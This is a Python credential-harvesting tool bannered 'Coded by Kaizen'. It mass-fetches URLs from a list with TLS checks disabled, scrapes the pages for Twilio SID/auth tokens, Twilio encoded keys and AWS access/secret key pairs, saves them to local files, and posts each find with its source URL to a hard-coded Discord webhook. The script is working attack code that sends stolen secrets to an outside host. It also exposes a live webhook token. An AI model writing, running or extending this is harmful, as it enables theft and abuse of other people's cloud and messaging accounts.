import multiprocessing.pool
import re
import requests
import multiprocessing
from datetime import datetime
import httpx

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

TWILIO_SID_PATTERN = re.compile(r'AC[a-f0-9]{32}')
TWILIO_AUTH_PATTERN = re.compile(r'(?i)[\'"]?([0-9a-f]{32})[\'"]?')
TWILIO_ENCODE_PATTERN = re.compile(r'QU[A-Za-z0-9]{88}==')
AWS_ACCESS_KEY_PATTERN = re.compile(r'AKIA[0-9A-Z]{16}')
AWS_SECRET_KEY_PATTERN = re.compile(r'(?<=[\'\"])[0-9a-zA-Z\/+]{40}(?=[\'\"])')

WEBHOOK_URL = 'https://discord.com/api/webhooks/1286348247618687046/J7b_xcmtXAdZcIS3eplgFZOvhrTIGWL-SU1W_DtnNmkQ52NlOSFQgvZI9zuuaJjOHVhV'

def send_discord_webhook(url: str, key_type: str, key_value: str) -> None:
    current_time = datetime.now().strftime("%m/%d/%Y %I:%M %p")
    payload = {
        "content": f"```diff\n+ JS Result\n\nLeaks Links :\n{url}\n\n{key_type} Detected :\n{key_value}\n\n{current_time}```"
    }
    try:
        httpx.post(WEBHOOK_URL, json=payload)
        print(f"Sent to Discord: {key_type} detected in {url}")
    except Exception as e:
        print(f"[ERROR] Failed to send webhook notification: {e}")

def parse_twilio_credentials(url: str, response_body: str) -> None:
    matched: bool = False
    sid_keys = TWILIO_SID_PATTERN.findall(response_body)
    auth_keys = TWILIO_AUTH_PATTERN.findall(response_body)

    for sid_key in list(set(sid_keys)):
        for auth_key in list(set(auth_keys)):
            if not re.search('[a-f]', auth_key):
                continue
            if not re.search('[0-9a-f]', auth_key):
                continue
            formatstr = f'{sid_key}|{auth_key}'
            print(f'{url} - {formatstr}')
            with open('twilio_credentials.txt', 'a') as f:
                f.write(f'{formatstr}\n')
            send_discord_webhook(url, "Twilio SID/Auth Token", formatstr)
            matched = True

    if not matched:
        print(f'{url} - Check the TWILIO credentials manually')
        with open('check_manually.txt', 'a') as f:
            f.write(f'{url}\n')

def parse_twilio_encoded_keys(url: str, response_body: str) -> None:
    matched: bool = False
    encoded_keys = TWILIO_ENCODE_PATTERN.findall(response_body)

    for encoded_key in list(set(encoded_keys)):
        print(f'{url} - Encoded Key: {encoded_key}')
        with open('twilio_encoded_keys.txt', 'a') as f:
            f.write(f'Encoded: {encoded_key}\n')
        send_discord_webhook(url, "Twilio Encoded Key", encoded_key)
        matched = True

    if not matched:
        print(f'{url} - No encoded Twilio keys found')

def parse_aws_credentials(url: str, response_body: str) -> None:
    matched: bool = False
    access_keys = AWS_ACCESS_KEY_PATTERN.findall(response_body)
    secret_keys = AWS_SECRET_KEY_PATTERN.findall(response_body)

    for access_key in list(set(access_keys)):
        for secret_key in list(set(secret_keys)):
            formatstr = f'{access_key}|{secret_key}'
            print(f'{url} - AWS: {formatstr}')
            with open('aws_credentials.txt', 'a') as f:
                f.write(f'{formatstr}\n')
            send_discord_webhook(url, "AWS Access/Secret Key", formatstr)
            matched = True

    if not matched:
        print(f'{url} - Check AWS credentials manually')
        with open('check_manually.txt', 'a') as f:
            f.write(f'{url}\n')

def request_url(url: str) -> None:
    try:
        response = requests.get(
            url=url,
            timeout=10,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        )
        if TWILIO_SID_PATTERN.search(response.text):
            parse_twilio_credentials(url, response.text)
        if TWILIO_ENCODE_PATTERN.search(response.text):
            parse_twilio_encoded_keys(url, response.text)
        if AWS_ACCESS_KEY_PATTERN.search(response.text):
            parse_aws_credentials(url, response.text)
        else:
            print(f'{url} - No Twilio or AWS credentials found')
    except Exception as e:
        print(f'{url} - {e.__class__.__name__}')

def main() -> None:
    print(r"""
     ____.                    ____  __.__.__  .__                
    |    |____ ___  _______  |    |/ _|__|  | |  |   ___________ 
    |    \__  \\  \/ /\__  \ |      < |  |  | |  | _/ __ \_  __ \
/\__|    |/ __ \\   /  / __ \|    |  \|  |  |_|  |_\  ___/|  | \/
\________(____  /\_/  (____  /____|__ \__|____/____/\___  >__|   
              \/           \/        \/                 \/       

    PT. TWILIO INDONESIA - Coded by Kaizen
    """)
    urls = open(input('Enter file path: '), 'r').read().splitlines()
    pool = multiprocessing.Pool(processes=50)
    pool.map(request_url, urls)
    pool.close()
    pool.join()

if __name__ == '__main__':
    main()

